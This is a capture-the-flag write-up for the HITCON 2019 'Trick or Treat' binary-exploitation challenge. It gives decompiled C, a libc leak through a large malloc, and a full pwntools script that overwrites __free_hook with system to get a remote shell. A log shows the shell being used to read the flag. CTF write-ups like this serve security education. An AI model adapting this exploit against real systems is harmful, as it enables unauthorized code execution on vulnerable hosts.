# í ¼í¾ƒ Trick or Treat í ¼í¾ƒ

## description

```
í ¼í¾ƒ Trick or Treat í ¼í¾ƒ [234pts]
Trick or Treat !!

nc 3.112.41.140 56746
```



## binary

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+4h] [rbp-2Ch]
  __int128 size; // [rsp+8h] [rbp-28h]
  __int64 v5; // [rsp+18h] [rbp-18h]
  _QWORD *v6; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  size = 0uLL;
  v5 = 0LL;
  v6 = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  write(1, "Size:", 5uLL);
  __isoc99_scanf("%lu", &size);
  v6 = malloc(size);
  if ( v6 )
  {
    printf("Magic:%p\n", v6);
    for ( i = 0; i <= 1; ++i )
    {
      write(1, "Offset & Value:", 0x10uLL);
      __isoc99_scanf("%lx %lx", (char *)&size + 8);
      v6[*((_QWORD *)&size + 1)] = v5;
    }
  }
  _exit(0);
}
```

yes, too simple! I love tricky one.

`malloc()` normally returns a pointer to heap.

If the given size is too large, `malloc()` does `mmap()` internally and returned memory address is continuous to library address. So the `Magic` is equal to libc leak.

## exploit

We can overwrite any address on libc. The easiest way is overwite `__*alloc_hook` or `__free_hook`. That's because `__isoc99_scanf` internally calls `malloc`, `realloc` and `free` if user stdin input is too long.

Within first loop we will overwite the hook function. And we have to trigger it on the second loop.

```python
from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./trick_or_treat"
try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})

def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass
libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'
def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

r.recvuntil ("Size:")
r.sendline (str (2**21 ))
r.recvuntil (":")
libc_leak = int(r.recvline ()[:-1], 16) & 0xfffffffff000
libc_base = libc_leak + 0x201000
print "libc_leak: " + hex(libc_leak)
print "libc_base: " + hex(libc_base)
cmd = """
b free
b malloc
b memmove
b strnlen
b wcschr
b realloc
b strncasecmp_l
b strchrnul
b system
b memcmp
c
"""
do_debug (cmd)
system = libc_base + libc.symbols["system"]
target = libc_base + 0x03EB180- 0x10
target = libc_base + libc.symbols["__free_hook"] - 0x10
print "target: " + hex(target)
offset = (target - libc_leak) / 8

r.recvuntil (":")
r.sendline ("{} {}".format(hex(offset), hex(system)))
r.sendline ("a"*0x8000 + "cccccccc")
r.sendline ("       ed")
r.sendline ("!sh")
r.interactive ()
```

well `system("/bin/sh");` didn't work well. Idk but just guess due to terminal(tty) issue. 



```sh
âžœ  trick python sol.py 3.112.41.140 56746
[*] For remote: sol.py HOST PORT
[+] Opening connection to 3.112.41.140 on port 56746: Done
[*] '/home/bincat/pwn/hitcon-2019/trick/trick_or_treat'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/bincat/pwn/hitcon-2019/trick/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak: 0x7fa920472000
libc_base: 0x7fa920673000
target: 0x7fa920a608d8
[*] Switching to interactive mode
\x00Offset & Value:\x00$ id
uid=1001(trick_or_treat) gid=1001(trick_or_treat) groups=1001(trick_or_treat)
$ cat /home/trick_or_treat/flag
hitcon{T1is_i5_th3_c4ndy_for_yoU}
$  
```

